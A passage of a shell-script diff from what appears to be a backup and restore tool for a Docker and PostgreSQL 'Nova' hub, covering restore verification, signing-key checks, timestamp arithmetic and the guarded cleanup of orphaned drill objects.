+       there. The match is by CONTENT, so a RENUMBERED migration matches — this
+       one does not."
+        return 1
+      fi
+    done < "$migr_file"
+    printf 'migrations %s: %s applied, every one found by content in %s\n' \
+      "$db" "$(wc -l < "$migr_file" | tr -d ' ')" "services/$svc/migrations"
+  done <<EOF
+$(bk_m_rows databases "name,owner,dump_member,counts_member,migrations_member,tables" < "$manifest")
+EOF
+  if [ "$dbs_total" -eq 0 ]; then
+    bk_fail "this bundle carries no database. Nova's state is three of them, so none is
+       a bundle this tool restores from."
+    return 1
+  fi
+
+  # ── 8. the carried .env keys — a plan, then an apply, then a re-read ─────
+  #
+  # The bundle carries a KEY SET, not a file (§6.2): COMPOSE_FILE, NOVA_SUBNET*,
+  # NOVA_WEB_ADDR, NOVA_TAILSCALE_ADDR, COMPOSE_PROFILES and TS_AUTHKEY are
+  # `host` and never travel. Without that split, step 3 writes NOVA_SUBNET and
+  # this step finds the bundle's value present and different, and the restore
+  # the whole slice exists for deadlocks against itself (python-tool M4).
+  #
+  # A replacement is NOT a refusal and needs no confirmation: step 6 already
+  # refused a non-empty target, so a conflicting secret here was generated by
+  # an install whose postgres never initialised with it. The bound, stated: a
+  # key the operator hand-edited for a reason IS replaced, and he sees the
+  # list of replaced key NAMES — never a value, on either side.
+  if [ "$drill" -eq 0 ]; then
+    carried="$stage/carried.env"
+    if bk_stage_has "$BK_RES_VOL" "$crypto_img" "open/env/carried.env"; then
+      bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/env/carried.env" > "$carried" || {
+        bk_fail "could not read env/carried.env out of the opened bundle."
+        return 1
+      }
+      chmod 600 "$carried" 2>/dev/null
+    else
+      : > "$carried"
+      chmod 600 "$carried" 2>/dev/null
+    fi
+    plan_write=""
+    plan_same=""
+    plan_replace=""
+    while IFS= read -r line; do
+      case "$line" in "" | "#"*) continue ;; esac
+      k="${line%%=*}"
+      v="${line#*=}"
+      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
+      cur="$(get_env_value "$k")"
+      if [ -z "$cur" ]; then
+        plan_write="$plan_write $k"
+      elif [ "$cur" = "$v" ]; then
+        plan_same="$plan_same $k"
+      else
+        plan_replace="$plan_replace $k"
+      fi
+    done < "$carried"
+    while IFS= read -r line; do
+      case "$line" in "" | "#"*) continue ;; esac
+      k="${line%%=*}"
+      v="${line#*=}"
+      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
+      set_env_value "$k" "$v"
+    done < "$carried"
+    chmod 600 "$(bk_env_file)" 2>/dev/null
+    line="$(bk_mode_of "$(bk_env_file)")"
+    if [ "$line" != "600" ]; then
+      bk_fail "$(bk_env_file) reads back mode ${line:-unreadable} after the carried keys
+       were written, not 600. It holds every secret this hub has."
+      return 1
+    fi
+    while IFS= read -r line; do
+      case "$line" in "" | "#"*) continue ;; esac
+      k="${line%%=*}"
+      v="${line#*=}"
+      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
+      if [ "$(get_env_value "$k")" != "$v" ]; then
+        bk_fail "the carried key $k did not read back out of $(bk_env_file) as it was
+       written. No value is printed here, on either side; the NAME is the fact."
+        return 1
+      fi
+    done < "$carried"
+    printf 'env: %s carried key(s) written, %s already identical, %s replaced%s\n' \
+      "$(printf '%s' "$plan_write" | wc -w | tr -d ' ')" \
+      "$(printf '%s' "$plan_same" | wc -w | tr -d ' ')" \
+      "$(printf '%s' "$plan_replace" | wc -w | tr -d ' ')" \
+      "$([ -n "$plan_replace" ] && printf ':%s' "$plan_replace")"
+    printf '     every one re-read out of %s and equal; no value was printed\n' "$(bk_env_file)"
+  fi
+
+  # ── 10. the in-progress marker, BEFORE the first docker volume create ────
+  #
+  # shell-first M4. Without it a restore that fails at step 12 leaves six
+  # labelled half-populated volumes and a container, and the re-run refuses on
+  # state it created itself with no verb that clears it — so the operator's
+  # only route is hand-run `docker volume rm` on his only copy of the data,
+  # unguided, at the worst possible moment. Nothing is ever discovered: this
+  # list IS the bound.
+  vols_total=0
+  got=""
+  while IFS=$'\037' read -r vol_key vol_full disp line n want; do
+    [ -n "$vol_key" ] || continue
+    if ! bk_is_volume_key "$vol_key"; then
+      bk_fail "the manifest carries a volume key '$vol_key'. A key this shell is about
+       to put in a path and in a docker object name is
+       [A-Za-z0-9][A-Za-z0-9_.-]* and nothing else."
+      return 1
+    fi
+    if [ "$drill" -eq 1 ]; then
+      got="$got nova-drill-${D}_${vol_key}"
+    else
+      full="$(cfg_volume_name "$vol_key" < "$facts/config.yaml")"
+      if [ -z "$full" ]; then
+        bk_fail "this bundle carries the volume \`$vol_key\` and this checkout's render
+       declares no such volume, so nothing here knows what to call it on this
+       machine. A restore never takes a docker object's name out of the file it
+       is opening."
+        return 1
+      fi
+      got="$got $full"
+    fi
+    vols_total=$((vols_total + 1))
+  done <<EOF
+$(bk_m_rows volumes "key,full_name,disposition,prefix,entries,files" < "$manifest")
+EOF
+
+  if [ "$drill" -eq 0 ]; then
+    bundle_sha="$(sha256_of "$bundle")" || return 1
+    marker="$(bk_restore_marker)"
+    body="$(printf 'started=%s\nbundle=%s\nbundle_sha256=%s\nproject=%s\nvolumes=%s\ncontainers=%s\n' \
+      "$(bk_stamp)" "$bundle_base" "$bundle_sha" "$project" "${got# }" "postgres")"
+    bk_write_marker "$marker" "$body" || return 1
+    printf 'marker: %s records the %s object(s) this run is about to create\n' \
+      "$marker" "$((vols_total + 1))"
+  fi
+
+  # ── 9. create each volume and fill it, then diff its listing ─────────────
+  #
+  # The labels are not decoration: an unlabelled volume is one
+  # `docker compose up` will not adopt, so it is read back off
+  # `docker volume inspect` before a byte is written into it.
+  #
+  # A DRILL runs this step too (port-v3 M5). §8.3 of one of the designs
+  # omitted it, and a drill that skips it proves the three dumps restore and
+  # proves NOTHING about v4_memdata (the notes, which exist nowhere else) or
+  # v4_workspace (a file she wrote lives only here).
+  while IFS=$'\037' read -r vol_key vol_full disp line n want; do
+    [ -n "$vol_key" ] || continue
+    bk_is_volume_key "$vol_key" || return 1
+    if [ "$line" != "volumes/$vol_key/" ] || [ "$want" = "" ] ||
+      [ "$disp" = "" ] || [ "$vol_full" = "" ]; then
+      bk_fail "the manifest's row for the volume \`$vol_key\` is not the shape a Nova
+       bundle writes (prefix '$line', disposition '$disp', full name '$vol_full')."
+      return 1
+    fi
+    vol_tree="$vol_full"
+    if [ "$drill" -eq 1 ]; then
+      full="nova-drill-${D}_${vol_key}"
+      bk_drill_volume_create "$full" || return 1
+    else
+      full="$(cfg_volume_name "$vol_key" < "$facts/config.yaml")"
+      if [ -z "$full" ]; then
+        bk_fail "this bundle carries \`$vol_key\` and this checkout declares no such
+       volume."
+        return 1
+      fi
+      if ! bk_docker volume create --label "com.docker.compose.project=$project" \
+        --label "com.docker.compose.volume=$vol_key" "$full" >/dev/null 2>&1; then
+        bk_fail "could not create the volume $full."
+        return 1
+      fi
+      got="$(bk_docker volume inspect "$full" \
+        --format '{{index .Labels "com.docker.compose.project"}} {{index .Labels "com.docker.compose.volume"}}' 2>/dev/null)"
+      if [ "$got" != "$project $vol_key" ]; then
+        bk_fail "$full was created and \`docker volume inspect\` reports its compose
+       labels as '${got:-none}', not '$project $vol_key'. An unlabelled volume is
+       one \`docker compose up\` will not adopt, so the restore would come up on a
+       fresh empty one."
+        return 1
+      fi
+      if [ "$full" != "$vol_full" ]; then
+        printf 'volume %s: this machine calls it %s; the bundle recorded %s\n' \
+          "$vol_key" "$full" "$vol_full"
+      fi
+    fi
+    bk_fill_volume "$full" "$pg_tag" "$BK_RES_VOL" "$vol_key" "$vol_tree" || return 1
+  done <<EOF
+$(bk_m_rows volumes "key,full_name,disposition,prefix,entries,files" < "$manifest")
+EOF
+
+  # ── 11. a postgres to restore THROUGH ────────────────────────────────────
+  #
+  # Routine: this project's own, brought up on its own volume, which
+  # postgres-init has just initialised from the checkout with the CARRIED
+  # password (the reason the carried .env is written before this and not
+  # after).
+  #
+  # Drill: a throwaway server on a throwaway network with an EXPLICIT subnet
+  # (shell-first m9 — a drill network with no IPAM takes whatever block docker
+  # hands it, which on a busy host can be the very block a subsequent real
+  # restore was about to pick). Its password is fresh, reaches the container
+  # through a file inside the content volume and never through argv or `-e`,
+  # which `docker inspect` would show for the container's whole lifetime.
+  if [ "$drill" -eq 1 ]; then
+    if ! command -v pick_project_subnet >/dev/null 2>&1; then
+      bk_fail "pick_project_subnet is not defined. deploy/subnet.sh is sourced by
+       deploy/install.sh; a drill will not create a network with no IPAM of its
+       own."
+      return 1
+    fi
+    inuse="$(docker_subnets_in_use "")" || {
+      bk_fail "docker could not be asked which subnets are allocated. Refusing to put
+       a drill network on a block nobody checked."
+      return 1
+    }
+    routes="$(host_routes_in_use)" || {
+      bk_fail "this host's routes could not be read. Refusing to put a drill network
+       on a block nobody checked."
+      return 1
+    }
+    subnet="$(pick_project_subnet "$(printf '%s\n%s\n' "$inuse" "$routes" | awk 'NF')")" || {
+      bk_fail "every candidate subnet is already in use on this machine, so a drill
+       network cannot be given an explicit one."
+      return 1
+    }
+    bk_drill_net_create "nova-drill-${D}-net" "$subnet" || return 1
+    net="nova-drill-${D}-net"
+    pghost="nova-drill-${D}-pg"
+    bk_drill_volume_create "nova-drill-${D}_pgdata" || return 1
+    line="$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
+    if [ "${#line}" -ne 32 ]; then
+      bk_fail "could not read 16 random bytes for the drill server's password."
+      return 1
+    fi
+    printf '%s' "$line" | bk_stage_put "$BK_RES_VOL" "$pg_tag" ".drillpw" || {
+      bk_fail "could not stage the drill server's password inside $BK_RES_VOL."
+      return 1
+    }
+    printf '*:*:*:postgres:%s\n' "$line" | bk_stage_put "$BK_RES_VOL" "$pg_tag" ".pgpass" || {
+      bk_fail "could not stage the drill server's .pgpass inside $BK_RES_VOL."
+      return 1
+    }
+    bk_pg_run --network none -v "$BK_RES_VOL:/stage" --entrypoint chmod "$pg_tag" \
+      600 /stage/.pgpass /stage/.drillpw >/dev/null 2>&1
+    bk_drill_assert_name "$pghost" "create" || return 1
+    if ! bk_docker run -d --name "$pghost" --network "$net" \
+      -v "nova-drill-${D}_pgdata:/var/lib/postgresql/data" \
+      -v "$BK_RES_VOL:/stage:ro" \
+      -v "$BK_DIR/postgres-init:/docker-entrypoint-initdb.d:ro" \
+      -e POSTGRES_PASSWORD_FILE=/stage/.drillpw \
+      -e POSTGRES_USER=postgres -e POSTGRES_DB=postgres \
+      "$pg_tag" >/dev/null 2>&1; then
+      bk_fail "could not start the drill's throwaway postgres $pghost."
+      return 1
+    fi
+    BK_RES_DRILL_CT="$pghost"
+    BK_RES_DRILL_PGID="$pghost"
+    got="$(bk_docker inspect "$pghost" \
+      --format '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}' 2>/dev/null)"
+    if [ "${got% }" != "$net" ]; then
+      bk_fail "the drill's postgres is attached to [${got% }] and the drill created
+       exactly $net. A drill that can reach the live project network is not a
+       drill."
+      return 1
+    fi
+    line="$(( $(date +%s) + 240 ))"
+    while :; do
+      if bk_docker exec "$pghost" pg_isready -U postgres >/dev/null 2>&1; then
+        break
+      fi
+      if [ "$(date +%s)" -ge "$line" ]; then
+        bk_fail "the drill's throwaway postgres never answered pg_isready within 240s.
+       The last 20 log lines:
+$(bk_docker logs --tail 20 "$pghost" 2>&1 | sed 's/^/       /')"
+        return 1
+      fi
+      sleep 2
+    done
+    pgid="$pghost"
+    printf 'drill: a throwaway postgres on %s (%s), isolated from every live network\n' \
+      "$net" "$subnet"
+  else
+    net="$(bk_cfg_network_name default < "$facts/config.yaml")"
+    if [ -z "$net" ]; then
+      bk_fail "the render names no docker network for the compose network \`default\`."
+      return 1
+    fi
+    pghost="postgres"
+    if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" up -d postgres >/dev/null 2>&1; then
+      bk_fail "\`docker compose up -d postgres\` did not exit 0, so there is nothing to
+       restore through."
+      return 1
+    fi
+    unhealthy="$(bk_wait_healthy postgres)" || {
+      bk_fail "postgres did not come back healthy within 240s. The last 20 log lines:
+$(bk_docker compose "${BK_COMPOSE_ARGS[@]}" logs --tail 20 postgres 2>&1 | sed 's/^/       /')"
+      return 1
+    }
+    pgid="$(bk_container_id postgres running)"
+    if [ -z "$pgid" ]; then
+      bk_fail "postgres reports healthy and no container of this project carries the
+       label com.docker.compose.service=postgres."
+      return 1
+    fi
+    got="$(bk_psql "$pgid" postgres "SHOW server_version" 2>/dev/null)"
+    if [ -z "$got" ]; then
+      bk_fail "the server this restore is about to write to would not say what version
+       it is."
+      return 1
+    fi
+    if [ "$got" = "$srv_want" ]; then
+      printf 'postgres: this server is %s, the same version the bundle was written on\n' "$got"
+    else
+      printf 'postgres: this server is %s and the bundle was written on %s. The tag\n' \
+        "$got" "$srv_want"
+      printf '          pins the MAJOR only, so this is stated, not refused; majors %s\n' \
+        "${got%%.*} and ${srv_want%%.*}"
+    fi
+    # The carried password, so every throwaway container below reaches the
+    # server the same way the backup side did — through a file inside the
+    # content volume, never `-e PGPASSWORD`, which `docker inspect` shows for
+    # the container's whole lifetime.
+    line="$(bk_env_value POSTGRES_PASSWORD)"
+    if [ -z "$line" ]; then
+      bk_fail "$(bk_env_file) carries no POSTGRES_PASSWORD after the carried keys were
+       written, so no container can reach the server to restore into it."
+      return 1
+    fi
+    printf '*:*:*:postgres:%s\n' "$(printf '%s' "$line" | sed 's/[\\:]/\\&/g')" |
+      bk_stage_put "$BK_RES_VOL" "$pg_tag" ".pgpass" || {
+        bk_fail "could not stage the postgres password inside $BK_RES_VOL."
+        return 1
+      }
+    bk_pg_run --network none -v "$BK_RES_VOL:/stage" --entrypoint chmod "$pg_tag" \
+      600 /stage/.pgpass >/dev/null 2>&1
+  fi
+
+  # ── 12/13. restore each database, then RE-MEASURE it ─────────────────────
+  tables_total=0
+  sign_db=""
+  dbs_total=0
+  while IFS=$'\037' read -r db owner dump_m counts_m migr_m tbl; do
+    [ -n "$db" ] || continue
+    dbs_total=$((dbs_total + 1))
+    if [ "$drill" -eq 1 ]; then
+      scratch="nova_verify_$(bk_hex8)" || return 1
+      bk_assert_verify_name "$scratch" "create" || return 1
+      BK_RES_DRILL_DBS="$BK_RES_DRILL_DBS
+$scratch"
+      if ! bk_psql "$pgid" postgres \
+        "CREATE DATABASE $(bk_sql_ident "$scratch") OWNER $(bk_sql_ident "$owner")" >/dev/null 2>&1; then
+        bk_fail "the drill could not create $scratch owned by $owner on its throwaway
+       server. deploy/postgres-init/01-databases.sql creates the three roles on a
+       fresh volume; a bundle naming another owner has none here."
+        return 1
+      fi
+      bk_assert_verify_name "$scratch" "pg_restore into" || return 1
+    else
+      scratch="$db"
+      # The database and its owning role are created by
+      # deploy/postgres-init/01-databases.sql on a FRESH v4_pgdata. Missing is
+      # a refusal rather than something this creates by hand: a database this
+      # tool made is a database postgres-init did not, and the difference is
+      # exactly the grants.
+      if [ "$(bk_psql "$pgid" postgres "SELECT 1 FROM pg_database WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null)" != "1" ]; then
+        bk_fail "the server has no database $db. deploy/postgres-init/01-databases.sql
+       creates it on a FRESH v4_pgdata — a volume that already held data does not
+       re-run it. Nothing here creates it by hand."
+        return 1
+      fi
+      if [ "$(bk_psql "$pgid" postgres "SELECT 1 FROM pg_roles WHERE rolname = $(bk_sql_lit "$owner")" 2>/dev/null)" != "1" ]; then
+        bk_fail "the server has no role $owner, which owns $db."
+        return 1
+      fi
+      rc=0
+      got="$(bk_table_list "$pgid" "$db")" || rc=$?
+      if [ "$rc" -ne 0 ]; then
+        bk_fail "could not list the tables of $db, so nothing here can say it is empty."
+        return 1
+      fi
+      if [ -n "$got" ]; then
+        bk_fail "$db already holds $(printf '%s\n' "$got" | sed '/^$/d' | wc -l | tr -d ' ') table(s). A restore goes onto an EMPTY
+       target, and a bad restore cannot be rolled back in place."
+        return 3
+      fi
+    fi
+    bk_pg_restore_into "$BK_RES_VOL" "$pg_tag" "$net" "$pghost" "$scratch" "$owner" "$db.dump" || return 1
+    rc=0
+    bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/db/$db.counts.tsv" \
+      > "$stage/$db.counts.tsv" || rc=$?
+    if [ "$rc" -ne 0 ] || [ ! -s "$stage/$db.counts.tsv" ]; then
+      bk_fail "could not read db/$db.counts.tsv out of the opened bundle, so the
+       restore of $db cannot be measured against it."
+      return 1
+    fi
+    got="$(bk_compare_census "$pgid" "$scratch" "$stage/$db.counts.tsv")" || return 1
+    # The manifest records the NUMBER of tables measured, not "ok" (§5.3), so
+    # it is compared too: a bundle whose two records of its own size disagree
+    # is not one anything here restores from.
+    if [ "$got" != "$tbl" ]; then
+      bk_fail "the manifest records $tbl tables for $db and db/$db.counts.tsv names $got.
+       This bundle disagrees with itself about how big it is."
+      return 1
+    fi
+    tables_total=$((tables_total + got))
+    printf 'database %s -> %s: %s tables compared, every count and digest equal\n' \
+      "$db" "$scratch" "$got"
+    if [ "$(bk_psql "$pgid" "$scratch" "SELECT to_regclass('public.core_signing_key') IS NOT NULL" 2>/dev/null)" = "t" ]; then
+      sign_db="$scratch"
+    fi
+  done <<EOF
+$(bk_m_rows databases "name,owner,dump_member,counts_member,migrations_member,tables" < "$manifest")
+EOF
+
+  # ── 14. the signing key ──────────────────────────────────────────────────
+  sign_want="$(bk_m_sub identity core_signing_key_sha256 < "$manifest")" || sign_want=""
+  if [ -z "$sign_db" ]; then
+    if [ -n "$sign_want" ]; then
+      bk_fail "the manifest records a core signing key and no restored database has a
+       public.core_signing_key to compare it against. Every paired device pins
+       that key."
+      return 1
+    fi
+    printf 'signing key: the bundle carried none and no restored database has the table\n'
+  else
+    bk_compare_signing_key "$pgid" "$sign_db" "$sign_want" || return 1
+  fi
+
+  # ── 15. park, and the two markers ────────────────────────────────────────
+  if [ "$drill" -eq 0 ]; then
+    if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" stop postgres >/dev/null 2>&1; then
+      bk_fail "everything verified and \`docker compose stop postgres\` did not exit 0.
+       Stop it by hand before running ./install."
+      return 4
+    fi
+    marker="$(bk_restored_marker)"
+    body="$(printf 'restored_at=%s\nbundle=%s\nbundle_sha256=%s\ncreated_at=%s\nsource_host=%s\nsource_repo_sha=%s\n' \
+      "$(bk_stamp)" "$bundle_base" "$bundle_sha" "$created_at" "$src_host" "${src_sha:-unrecorded}")"
+    bk_write_marker "$marker" "$body" || return 1
+    rm -f "$(bk_restore_marker)"
+    if [ -e "$(bk_restore_marker)" ]; then
+      bk_fail "could not remove $(bk_restore_marker), so a re-run would refuse on state
+       this very run finished."
+      return 1
+    fi
+  fi
+
+  # ── 16. the report ───────────────────────────────────────────────────────
+  #
+  # The word `restored` is printed HERE and only here, and only with the three
+  # facts behind it. If any of steps 9, 13 or 14 did not run, nothing above
+  # reached this line.
+  printf '\n'
+  if [ "$drill" -eq 1 ]; then
+    printf 'drill %s: %s tables compared across %s databases, %s volume listings diffed,\n' \
+      "$D" "$tables_total" "$dbs_total" "$vols_total"
+    printf '          signing key fingerprint equal.\n'
+  else
+    printf 'restored: %s tables compared across %s databases, %s volume listings diffed,\n' \
+      "$tables_total" "$dbs_total" "$vols_total"
+    printf '          signing key fingerprint equal.\n'
+  fi
+  printf 'from      %s (written %s on %s)\n' "$bundle_base" "$created_at" "$src_host"
+
+  # What this bundle says it does NOT carry, each with the reason recorded
+  # when it was written. A restore that cannot say what it is missing invites
+  # the operator to assume it is missing nothing.
+  line="$(bk_m_rows excluded "kind,name,disposition,reason" < "$manifest")"
+  if [ -n "$line" ]; then
+    printf '\nnot carried by this bundle (recorded when it was written):\n'
+    while IFS=$'\037' read -r k v n want; do
+      [ -n "$v" ] || continue
+      printf '  %-18s %-8s %s\n      %s\n' "$n" "$k" "$v" "$want"
+    done <<EOF
+$line
+EOF
+  fi
+
+  # Carried and NOT placed. §9.2 lists no step that writes a files[] member
+  # back onto the host, and this verb invents none: a path out of a bundle
+  # deciding where bytes land is the class that has bitten this file three
+  # times. deploy/.env is the only file member a v4 bundle carries today and
+  # its content reaches .env through the carried KEY SET at step 8, which is
+  # a plan this shell builds and verifies. Anything else is STATED here
+  # rather than silently dropped.
+  line="$(bk_m_rows files "member,origin,restore_to,mode,bytes,sha256" < "$manifest" |
+    while IFS=$'\037' read -r k v n want got f; do
+      [ -n "$k" ] || continue
+      [ "$n" = "deploy/.env" ] && continue
+      printf '  %s -> %s\n' "$k" "$n"
+    done)"
+  if [ -n "$line" ]; then
+    printf '\ncarried in this bundle and NOT written to disk by this verb:\n%s\n' "$line"
+    printf '  Open them by hand with:\n'
+    printf '    tar -xOf %s nova_restore.py > /tmp/nova_restore.py\n' "$bundle"
+    printf '    python3 /tmp/nova_restore.py %s --out ./opened\n' "$bundle"
+  fi
+
+  if [ "$drill" -eq 0 ]; then
+    printf '\nnext:\n  ./install\n'
+  fi
+
+  trap - INT TERM
+  trap - EXIT
+  if ! bk_restore_cleanup; then
+    if [ "$drill" -eq 1 ]; then
+      bk_fail "every count, digest and listing matched, and the teardown above could
+       not finish. A drill whose teardown cannot be verified is a FAILED drill:
+       the leftovers are named on their own lines."
+      return 1
+    fi
+    bk_fail "the restore IS verified. Separately: the cleanup above could not finish.
+       Each thing it could not do is named on its own line."
+    return 4
+  fi
+  return 0
+}
+
+# ── the stamp, and the age it implies ───────────────────────────────────────
+#
+# `YYYYMMDDTHHMMSSZ` sorts lexicographically, which is what lets `drill` find
+# the newest bundle with no `date -d` — macOS has none and there is no
+# portable epoch-from-string form (map-portability.md:63). The AGE needs civil
+# arithmetic instead, so days-from-civil is done here in integers. 10#$x
+# throughout: an hour written 08 is decimal, not octal.
+#
+# Prints seconds since the epoch. 1, printing nothing, when $1 is not a stamp.
+bk_stamp_epoch() {
+  local s="$1" y m d hh mm ss era yoe doy doe days
+  case "$s" in
+    [0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]T[0-9][0-9][0-9][0-9][0-9][0-9]Z) ;;
+    *) return 1 ;;
+  esac
+  y=$((10#$(printf '%s' "$s" | cut -c1-4)))
+  m=$((10#$(printf '%s' "$s" | cut -c5-6)))
+  d=$((10#$(printf '%s' "$s" | cut -c7-8)))
+  hh=$((10#$(printf '%s' "$s" | cut -c10-11)))
+  mm=$((10#$(printf '%s' "$s" | cut -c12-13)))
+  ss=$((10#$(printf '%s' "$s" | cut -c14-15)))
+  [ "$m" -ge 1 ] && [ "$m" -le 12 ] || return 1
+  [ "$d" -ge 1 ] && [ "$d" -le 31 ] || return 1
+  [ "$hh" -le 23 ] && [ "$mm" -le 59 ] && [ "$ss" -le 60 ] || return 1
+  [ "$m" -le 2 ] && y=$((y - 1))
+  era=$((y / 400))
+  yoe=$((y - era * 400))
+  if [ "$m" -gt 2 ]; then
+    doy=$(((153 * (m - 3) + 2) / 5 + d - 1))
+  else
+    doy=$(((153 * (m + 9) + 2) / 5 + d - 1))
+  fi
+  doe=$((yoe * 365 + yoe / 4 - yoe / 100 + doy))
+  days=$((era * 146097 + doe - 719468))
+  printf '%s\n' "$((days * 86400 + hh * 3600 + mm * 60 + ss))"
+}
+
+# The stamp out of `nova-backup-<host>-<YYYYMMDDTHHMMSSZ>[-N].tar`, or 1.
+# Never the mtime: a file copied off a removable drive carries the copy's
+# time, and the stamp is what the bundle says about ITSELF.
+bk_bundle_stamp() {
+  local base="$1" body
+  body="${base%.tar}"
+  body="$(printf '%s' "$body" | sed 's/-[0-9][0-9]*$//')"
+  body="${body##*-}"
+  bk_stamp_epoch "$body" >/dev/null || return 1
+  printf '%s\n' "$body"
+}
+
+# ── the sweep (§9.4 step 1) ─────────────────────────────────────────────────
+#
+# A `finally` does not survive a process restart
+# (backend/app/backup_service.py:568-602), so the EXIT trap is not enough and
+# this is the other half.
+#
+# A RUN is LIVE while its `nova-drill-<RUN>-pg` container is RUNNING; its
+# objects are left alone (port-v3 m4 — an unconditional sweep deletes a
+# concurrent drill's volumes out from under it, which is not reachable with
+# one operator today and is reachable the day a scheduled handler lands). An
+# EXITED `-pg` container is itself wreckage, so it and its run's objects go.
+# That is one step past the verdict's wording, which makes any existing `-pg`
+# container mean "live": with that reading a drill killed mid-run leaves a
+# stopped container that nothing ever sweeps.
+#
+# The container filter is ANCHORED, because `docker ps --filter name=` is an
+# unanchored substring match and would be wider than the DRILL_RE the volume
+# sweep uses — and every name still passes DRILL_RE immediately before the
+# command that removes it.
+bk_drill_live_runs() {
+  local names n rest
+  names="$(bk_docker ps --filter "name=^nova-drill-" --format '{{.Names}}' 2>/dev/null)" || return 1
+  while IFS= read -r n; do
+    [ -n "$n" ] || continue
+    case "$n" in
+      nova-drill-*-pg)
+        rest="${n#nova-drill-}"
+        printf '%s\n' "${rest%-pg}"
+        ;;
+    esac
+  done <<EOF
+$names
+EOF
+}
+
+bk_drill_run_id_of() {
+  local name="$1" rest
+  rest="${name#nova-drill-}"
+  printf '%s' "$rest" | cut -c1-8
+}
+
+bk_drill_sweep() {
+  local live n name run removed=0 failures=0 kept=0 rows pgid db conns age
+  live="$(bk_drill_live_runs)" || {
+    bk_fail "\`docker ps --filter name=^nova-drill-\` could not be asked which drills are
+       running, so nothing here can tell an orphan from a live run. A sweep that
+       cannot tell them apart does not run."
+    return 1
+  }
+
+  # Containers first among the docker objects, because an exited container
+  # still pins the volumes it mounted.
+  n="$(bk_docker ps -a --filter "name=^nova-drill-" --format '{{.Names}}' 2>/dev/null)" || n=""
+  while IFS= read -r name; do
+    [ -n "$name" ] || continue
+    run="$(bk_drill_run_id_of "$name")"
+    if bk_list_has "$live" "$run"; then
+      kept=$((kept + 1))
+      continue
+    fi
+    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
+    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
+    # does not name is somebody else's object and is left alone and said so,
+    # never removed and never counted as a sweep failure.
+    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
+      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
+      kept=$((kept + 1))
+      continue
+    fi
+    bk_docker rm -f "$name" >/dev/null 2>&1
+    if bk_docker inspect "$name" >/dev/null 2>&1; then
+      bk_fail "the orphaned drill container $name would not go."
+      failures=$((failures + 1))
+    else
+      removed=$((removed + 1))
+    fi
+  done <<EOF
+$n
+EOF
+
+  n="$(bk_docker volume ls --filter "name=nova-drill-" --format '{{.Name}}' 2>/dev/null)" || n=""
+  while IFS= read -r name; do
+    [ -n "$name" ] || continue
+    run="$(bk_drill_run_id_of "$name")"
+    if bk_list_has "$live" "$run"; then
+      kept=$((kept + 1))
+      continue
+    fi
+    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
+    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
+    # does not name is somebody else's object and is left alone and said so,
+    # never removed and never counted as a sweep failure.
+    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
+      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
+      kept=$((kept + 1))
+      continue
+    fi
+    bk_docker volume rm -f "$name" >/dev/null 2>&1
+    if bk_docker volume inspect "$name" >/dev/null 2>&1; then
+      bk_fail "the orphaned drill volume $name would not go."
+      failures=$((failures + 1))
+    else
+      removed=$((removed + 1))
+    fi
+  done <<EOF
+$n
+EOF
+
+  n="$(bk_docker network ls --filter "name=nova-drill-" --format '{{.Name}}' 2>/dev/null)" || n=""
+  while IFS= read -r name; do
+    [ -n "$name" ] || continue
+    run="$(bk_drill_run_id_of "$name")"
+    if bk_list_has "$live" "$run"; then
+      kept=$((kept + 1))
+      continue
+    fi
+    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
+    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
+    # does not name is somebody else's object and is left alone and said so,
+    # never removed and never counted as a sweep failure.
+    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
+      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
+      kept=$((kept + 1))
+      continue
+    fi
+    bk_docker network rm "$name" >/dev/null 2>&1
+    if bk_docker network inspect "$name" >/dev/null 2>&1; then
+      bk_fail "the orphaned drill network $name would not go."
+      failures=$((failures + 1))
+    else
+      removed=$((removed + 1))
+    fi
+  done <<EOF
+$n
+EOF
+
+  # And the scratch databases. A drill of this build puts them on its own
+  # throwaway server, which the volume sweep above takes with it — so this
+  # exists for one a hand-run or an older build left on the LIVE server, and
+  # it states plainly when there is no server to ask rather than counting
+  # silence as a clean sweep.
+  pgid="$(bk_container_id postgres running 2>/dev/null)" || pgid=""
+  if [ -z "$pgid" ]; then
+    printf 'sweep: no running postgres of this project, so no live server could be\n'
+    printf '       holding a nova_verify_* database\n'
+  else
+    rows="$(bk_psql "$pgid" postgres "SELECT datname FROM pg_database WHERE datname LIKE 'nova\\_verify\\_%'" 2>/dev/null)" || {
+      bk_fail "could not list nova_verify_* databases on the live server, so the sweep
+       cannot say whether one is there."
+      return 1
+    }
+    while IFS= read -r db; do
+      [ -n "$db" ] || continue
+      bk_assert_verify_name "$db" "drop" || { failures=$((failures + 1)); continue; }
+      conns="$(bk_psql "$pgid" postgres "SELECT count(*) FROM pg_stat_activity WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null | tr -dc '0-9')"
+      if [ -z "$conns" ]; then
+        bk_fail "could not count the open connections to $db, so nothing can say it is
+       orphaned rather than in use."
+        failures=$((failures + 1))
+        continue
+      fi
+      if [ "$conns" -ne 0 ]; then
+        kept=$((kept + 1))
+        continue
+      fi
+      age="$(bk_psql "$pgid" postgres "SELECT CASE WHEN (pg_stat_file('base/' || oid::text)).modification < now() - interval '1 hour' THEN 1 ELSE 0 END FROM pg_database WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null | tr -dc '0-9')"
